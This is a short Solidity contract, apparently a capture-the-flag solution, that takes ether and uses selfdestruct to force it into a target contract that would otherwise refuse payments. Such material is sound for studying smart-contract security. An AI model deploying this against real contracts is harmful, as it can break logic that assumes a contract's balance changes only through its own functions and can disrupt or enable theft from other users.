pragma solidity ^0.8.0;


contract ForceAttack {
  
  address payable public force;

  constructor(address payable forceAddress) public {
    force = forceAddress;
  }

  function loadEther() public payable {
    
  }

  function kill() public returns (bool, bytes memory){
    selfdestruct(force);
  }
}
